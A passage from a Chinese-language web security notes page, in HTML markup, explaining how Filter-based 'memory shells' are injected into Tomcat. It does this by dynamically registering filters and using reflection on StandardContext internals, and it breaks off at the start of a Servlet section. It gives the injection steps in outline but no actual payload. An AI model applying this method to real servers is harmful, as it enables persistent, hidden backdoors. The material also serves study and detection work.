<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">filter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addMappingForUrlPatterns</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">EnumSet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">of</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DispatcherType</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">REQUEST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/*&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>使用 <code>ServletContextListener</code> 的 <code>contextInitialized</code> 方法在服务器启动时注册</p><p><code>ServletContextListener</code> 是 Java EE 规范中的一种监听器，它可以在服务器启动时执行一些操作。</p><p>通过在 <code>contextInitialized</code> 方法中调用 <code>ServletContext</code> 的 <code>addFilter()</code> 方法，可以在服务器启动时动态注册 <code>Filter</code>。</p><p>例如:</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> MyContextListener</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> implements</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletContextListener</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> contextInitialized</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletContextEvent</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> sce</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">        ServletContext</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> sce</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getServletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">        FilterRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filter</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;myFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> MyFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">());</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        filter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addMappingForUrlPatterns</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">EnumSet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">of</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DispatcherType</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">REQUEST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/*&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>后续在 Listener 内存马中进行描述</p></blockquote></li><li><p>使用 <code>ServletContainerInitializer</code> 的 <code>onStartup</code> 方法在初始化时注册</p><p><code>ServletContainerInitializer</code> 是 Servlet 3.0 中引入的一个接口，允许你在 Web 应用启动时做一些初始化工作。</p><p>在实现 <code>ServletContainerInitializer</code> 时，可以通过 <code>onStartup()</code> 方法动态注册 <code>Filter</code>。</p><p>与 <code>ServletContextListener</code> 不同的是，<code>ServletContainerInitializer</code> 是通过 SPI（服务提供者接口）机制自动加载的，因此它的调用顺序是由容器控制的，通常用于对整个应用进行初始化配置。</p><p>例如:</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> MyServletInitializer</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> implements</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletContainerInitializer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    @</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> onStartup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Set</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#C18401;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&gt; </span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">c</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletContext</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> ctx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">        FilterRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filter</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> ctx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;myFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> MyFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">());</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        filter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addMappingForUrlPatterns</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">EnumSet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">of</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DispatcherType</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">REQUEST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/*&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>这种注册方式不算严格的“动态”注册，因为它发生在应用初始化阶段，而不是运行时随时可以改变。</p></blockquote></li></ul><hr><p>本节只讨论使用 ServletContext 添加 Filter 内存马的方法。</p><p>首先来看一下 <code>createFilter</code> 方法，按照注释，这个类用来在调用 <code>addFilter</code> 向 ServletContext 实例化一个指定的 Filter 类。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409241528634.png" alt="img"></p><p>这个类还约定了一个事情，那就是如果这个 ServletContext 传递给 ServletContextListener 的 <code>ServletContextListener.contextInitialized</code> 方法，该方法既未在 <code>web.xml</code> 或 <code>web-fragment.xml</code> 中声明，也未使用 <code>javax.servlet.annotation.WebListener</code> 进行注释，则会抛出 <code>UnsupportedOperationException</code> 异常，这个约定其实是非常重要的一点。</p><blockquote><p>也即 Listener 必须在静态上下文中定义，具体来说，应该在 <code>web.xml</code> 文件或使用 <code>@WebListener</code> 注解进行声明。这种设计确保了在应用启动时，所有的监听器都已经明确配置好，从而避免了动态添加可能带来的不确定性和错误。</p><hr><p>我们利用此项做内存马注入的话, 首先排除利用 <code>web.xml</code> 注册 Listener, 其次注解又不能在 JSP 文件中使用, 因此不能直接使用 <code>ServletContext.addFilter</code> 而需要另辟蹊径</p></blockquote><hr><p>接下来看 <code>addFilter</code> 方法</p><p><code>ServletContext</code> 提供了三个重载的 <code>addFilter</code> 方法，用于在不同场景下添加 <code>Filter</code>。这些方法分别接收以下参数：</p><ul><li><p>字符串类型的 <code>filterName</code> 和 <code>Filter</code> 对象</p><p><code>addFilter(String filterName, Filter filter)</code></p><p>这个方法接收一个 <code>filterName</code> 和一个 <code>Filter</code> 实例，用于直接添加一个已经实例化的 <code>Filter</code></p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Filter</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> myFilter </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> MyFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">FilterRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterRegistration </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;myFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, myFilter);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>字符串类型的 <code>filterName</code> 和 <code>className</code> 字符串</p><p><code>addFilter(String filterName, String className)</code></p><p>用于添加一个通过类名指定的 <code>Filter</code></p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">FilterRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterRegistration </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;myFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;com.example.MyFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>字符串类型的 <code>filterName</code> 和 <code>Filter</code> 子类的 <code>Class</code> 对象</p><p><code>addFilter(String filterName, Class&lt;? extends Filter&gt; filterClass)</code></p><p>用于添加一个通过类对象指定的 <code>Filter</code></p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">FilterRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterRegistration </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;myFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">MyFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><p>所有这些方法都会返回一个 <code>FilterRegistration.Dynamic</code> 对象，该对象实际上是 <code>FilterRegistration</code> 的一个子类，用于进一步配置和管理动态添加的 <code>Filter</code>。例如:</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">FilterRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> filterRegistration </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;myFilter&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">MyFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">filterRegistration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addMappingForUrlPatterns</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">EnumSet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">of</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DispatcherType</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">REQUEST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/*&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">filterRegistration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setInitParameter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;paramName&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;paramValue&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p><code>addFilter</code> 方法实际上就是动态添加 filter 的最核心和关键的方法，但是这个类中同样约定了 <code>UnsupportedOperationException</code> 异常</p><p>由于 Servlet API 只是提供接口定义，具体的实现还要看具体的容器，那我们首先以 Tomcat 7.0.96 为例，看一下具体的实现细节。相关实现方法在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409241548399.png" alt="img"></p><blockquote><p>Tomcat8.5.100 中亦是如此:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409271130543.png" alt="image-20240927113045257"></p></blockquote><p>可以看到，这个方法创建了一个 FilterDef 对象，将 filterName、filterClass、filter 对象初始化进去，使用 StandardContext 的 <code>addFilterDef</code> 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回，并没有将这个 Filter 放到 FilterChain 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。</p><p>这时我们肯定要想，能不能直接操纵 FilterChain 呢？FilterChain 在 Tomcat 中的实现是 <code>org.apache.catalina.core.ApplicationFilterChain</code>，这个类提供了一个 <code>addFilter</code> 方法添加 Filter，这个方法接受一个 ApplicationFilterConfig 对象，将其放在 <code>this.filters</code> 中。答案是可以，但是没用，因为对于每次请求需要执行的 FilterChain 都是动态取得的。</p><blockquote><p><a href="#Filter%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">Filter的基本工作原理</a></p><ul><li><p><code>FilterChain</code> 是 Java Servlet API 中的一个接口，用于表示一组 <code>Filter</code> 的链条。每个 <code>Filter</code> 都可以在请求到达目标 <code>Servlet</code> 之前或响应返回客户端之前对请求和响应进行处理。<code>FilterChain</code> 的主要作用是管理和执行这些 <code>Filter</code>。</p></li><li><p><code>FilterChain</code> 维护了一个过滤器的有序列表，这些过滤器会按顺序对请求和响应进行处理。</p></li><li><p><code>FilterChain</code> 提供了一个 <code>doFilter</code> 方法，用于将请求和响应传递给链中的下一个过滤器或最终的目标 <code>Servlet</code>。</p></li></ul><p>每次请求的 <code>FilterChain</code> 都是动态取得的，因此直接操作 <code>FilterChain</code> 并不能全局影响所有请求。</p><p>强行在一次请求的 <code>FilterChain</code> 中添加一个 <code>Filter</code>，在该请求处理结束后，这个 <code>FilterChain</code> 实例也会被销毁, 相应的添加的 Filter 也会销毁; 每次请求都会生成一个新的 <code>FilterChain</code> 实例，这个实例只在当前请求的生命周期内有效, 只会影响当前请求的 <code>FilterChain</code> 实例，不会影响其他请求。</p><p><strong>请求生命周期</strong>:</p><ul><li><strong>请求到达服务器</strong>：当一个请求到达服务器时，服务器会根据请求的 URL 和过滤器的配置动态生成一个新的 <code>FilterChain</code> 实例。</li><li><strong>执行过滤器链</strong>：服务器依次调用 <code>FilterChain</code> 中的每个过滤器的 <code>doFilter</code> 方法。</li><li><strong>请求处理结束</strong>：当所有过滤器和目标 <code>Servlet</code> 处理完请求后，<code>FilterChain</code> 实例的生命周期也随之结束。</li></ul></blockquote><hr><p>那Tomcat 是如何处理一次请求对应的 FilterChain 的呢？在 ApplicationFilterFactory 的 <code>createFilterChain</code> 方法中，可以看到流程如下：</p><ul><li>在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配；</li><li>如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig；</li><li>如果获取到 filterConfig，则将其加入到 filterChain 中</li><li>后续将会循环 filterChain 中的全部 filterConfig，通过 <code>getFilter</code> 方法获取 Filter 并执行 Filter 的 <code>doFilter</code> 方法。</li></ul><p>通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。</p><p>在之前的 ApplicationContext 的 addFilter 中将 filter 初始化存在了 StandardContext 的 filterDefs 中，那后面又是如何添加在其他参数中的呢？</p><p>在 StandardContext 的 <code>filterStart</code> 方法中生成了 filterConfigs。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409241634869.png" alt="img"></p><p>在 ApplicationFilterRegistration 的 <code>addMappingForUrlPatterns</code> 中生成了 filterMaps。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409241634960.png" alt="img"></p><p>而这两者的信息都是从 filterDefs 中的对象获取的。</p><p>在了解了上述逻辑后，在应用程序中动态的添加一个 filter 的思路就清晰了：</p><ul><li>调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li><li>调用 StandardContext 的 filterStart 方法生成 filterConfigs；</li><li>调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；</li><li>为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位。</li></ul><p>基于以上思路的实现在 threedr3am 师傅的<a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener noreferrer">这篇文章</a>中有实现代码，这里不再重复</p><p>既然知道了需要修改的关键位置，那就没有必要调用方法去改，直接用反射加进去就好了，其中中间还有很多小细节可以变化，但都不是重点，略过。</p>`,93)),e("p",null,[i[1]||(i[1]=s("具体示例及实现部分可以在本文同级目录下的 ")),a(t,{to:"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Filter%E5%86%85%E5%AD%98%E9%A9%AC/servletContext-addFilter.html"},{default:l(()=>i[0]||(i[0]=[s("Tomcat内存马/Filter内存马/servletContext-addFilter")])),_:1}),i[2]||(i[2]=s(" 中查看"))]),i[21]||(i[21]=n('<hr><h3 id="servlet内存马" tabindex="-1"><a class="header-anchor" href="#servlet内存马"><span>Servlet内存马</span></a></h3><blockquote><p><a href="https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><p>Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一</p><p>与 Filter 相同，本小节也仅仅讨论使用 ServletContext 的相关方法添加 Servlet。</p><p>还是首先来看一下实现类 ApplicationContext 的 <code>addServlet</code> 方法:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409291130585.png" alt="img"></p><p>与上一小节看到的 <code>addFilter</code> 方法十分类似。那么我们面临同样的问题，在一次访问到达 Tomcat 时，是如何匹配到具体的 Servlet 